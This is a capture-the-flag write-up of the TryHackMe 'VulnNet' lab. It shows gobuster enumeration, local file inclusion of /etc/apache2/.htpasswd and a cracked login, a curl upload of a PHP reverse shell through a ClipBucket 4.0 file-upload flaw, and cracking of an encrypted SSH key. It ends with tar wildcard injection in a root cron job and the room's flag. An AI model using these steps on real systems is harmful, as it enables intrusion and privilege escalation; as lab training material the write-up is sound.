---
title: VulnNet
layout: post
author: Bit Criminals Team
date: 2021-05-03 17:02:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/vulnnet1
---

Lets start with a nmap scan.On scanning we got port 80 and 22 port 

![](/images/D4rkDemian/vulnet.png)

On checking the website we got a nice vulnnet page which didn't had anything important...

And also in the prompt we are provided with a domain **vulnnet.thm**. So lets scan for subdomains using gobuster 

```shell
gobuster vhost -u vulnnet.thm  -w /usr/share/dns 
```

we found two subdomains in which only one was working but it required authentication password.

```
broadcast.vulnnet.thm
```

Firstly add both the domains with the box ip to /etc/hosts.

Now lets run gobuster on the website which is running.

![](/images/D4rkDemian/vulnet2.png)

On searching all the directories we found something worth in /js.It gave us the hint that there is LFI(Local File Inclusion) in this box..

![](/images/D4rkDemian/vulnet3.png)

Now lets check for /etc/passwd and it worked!!

![](/images/vulnet4.png)

After playing a lot with LFI we finally found a password hash in 
```
/etc/apache2/.htpasswd
```
![](/images/D4rkDemian/vulnet5.png)

On cracking the hash using john we found that the auth credentials for **broadcast.vulnnet.thm** are 

```
developers:9972761drmfsls
```

So we are inside the **broadcast.vulnnet.thm**

It seems to be a website incorporating ClipBucket . 

![](/images/MaskdMafia/vulnnet1.png)

Checking the version shows us that it is running on ClipBucket version 4.0.
So we search for exploits in this version using the searchsploit command and come across this exploit:

![](/images/MaskdMafia/unknown.png)

(Although the name of the exploit shows that it is for versions lower than 4.0 , the comments inside the file say that it has been tested on version 4 too.)

```py
Clipbucket version 2.8.3 and version 4.0.0 have been tested. These versions were the latest at the time 
the security vulnerabilities were discovered.
```
There is a section in the exploit about arbitrary file upload to a ClipBucket website,so we try out that exploit to upload a php reverse shell.

```py
curl -F "file=@/opt/reverse_shell.php" -F "plupload=1" -F "name=anyname.php"
 "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
```
After that we start our listener on the specified port and navigate to the /actions/ directory and click on our exploit to open it.

![](/images/MaskdMafia/vulnnet2.png)

And we see that we have got a shell!
Searching through the system , we notice a very interesting file , ssh-backup.tar.gz in /var/backups.
So we extract the file to get the id_rsa key.However it is password encrypted.

```py
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A[REDACTED]9CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH[REDACTED]sugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J[REDACTED]Opu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUAD[REDACTED]URwnzW9+RwmmJS[REDACTED]0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----
```
So we copy it to our file and decrypt it using the following commands:
```py
python ssh2john.py id_rsa > key.hash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
After that we connect via ssh as server-management.
From there we can read user.txt to get our first flag.

After that comes privilege escalation. We try sudo -l but are prompted for a password (which we dont have :( ) so we search through the system manually but it yields no results. However on displaying the contents of /etc/crontab we see a very interesting file backupsrv.sh running. So we display the contents of the file to find out more about it.

```py
# m h dom mon dow user    command
*/2   * * * *    root    /var/opt/backupsrv.sh
17 *    * * *    root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

![](/images/MaskdMafia/vulnet3.png)

We see that it makes a backup of everything in the Document folder routinely.

Basically,it is a **CronJob** file.I searched about this in the web and here's what I found.
https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e

What this script does is basically,it creates backup of every file within the Downloads directory of the user.After reading the article I ran the commands given in the blog 

![](/images/vul4.png)
and ran /bin/bash -p  but it didin't work.

So,I changed my commnads a bit and used this instead.

```echo "chmod +s /bin/bash" > privesc.sh```

```echo "" > "--checkpoint-action=exec=sh privesc.sh"```

```echo "" > --checkpoint=1```

then,I ran /bin/bash -p and here's we get the root priviledges.

![](/images/vul5.png)

Congo, we get the flag,

***THM{220b671dd8adc301b34c2738ee8295ba}***
